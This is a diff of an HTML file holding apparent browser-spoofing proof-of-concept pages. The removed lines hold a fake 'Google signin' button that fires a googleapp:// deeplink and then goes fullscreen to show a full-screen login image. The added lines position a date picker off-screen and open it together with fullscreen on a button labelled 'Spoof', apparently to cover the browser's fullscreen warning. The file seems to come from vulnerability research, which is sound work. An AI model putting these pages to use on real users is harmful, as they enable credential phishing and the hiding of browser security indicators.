@@ -1,53 +1,33 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 
 <head>
-    <style>
-        #firstDiv {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
-        
-        #secondDiv {
-            margin: 0;
-            background-image: url("login.png");
-            background-repeat: no-repeat;
-            background-size: 100% 100%;
-            margin: 0;
-            height: 100%;
-            display: none;
-        }
-        
-        a {
-            background-color: blue;
-            color: white;
-            padding: 20px 40px;
-            border: none;
-            border-radius: 10px;
-            font-size: 40px;
-            cursor: pointer;
-            text-decoration: none;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="color-scheme" content="light dark">
+    <title>Date Picker Testing</title>
 </head>
+<style>
+    input {
+        all: initial;
+    }
 
-<body style="margin: 0;">
-    <div id="firstDiv">
-        <a onclick="run();" href="googleapp://deeplink/?data=CkwBDb3mGzBFAiEAic8-0un3nRrMa_hkMUV9fj_zD09xhu9D6xTXEsFSRPICIEJlWlJRSqv3afrbX9J8BZa_h3sAfF8NSDFAlLSj10MUEjkKAggAEgIIbxoQEg4IBBIK6oqo9AQECAFAACIdChtodHRwOi8vYXNzaXN0YW50Lmdvb2dsZS5jb20">Google signin</a>
-    </div>
-    <div id="secondDiv">
-    </div>
+    #datepicker {
+        position: absolute;
+        top: -100px;
+        left: 50%;
+    }
+</style>
+
+<body>
+    <input type="datetime-local" id="datepicker">
+    <button onclick="showDatePicker()">Spoof</button>
+
     <script>
-        const firstDiv = document.getElementById("firstDiv");
-        const secondDiv = document.getElementById("secondDiv");
-
-        function run() {
-            setTimeout(function() {
-                document.documentElement.requestFullscreen();
-                firstDiv.style.display = "none";
-                secondDiv.style.display = "block";
-            }, 1000);
+        const datePicker = document.getElementById('datepicker');
+        function showDatePicker() {
+            datePicker.showPicker();
+            document.documentElement.requestFullscreen();
         }
     </script>
 </body>
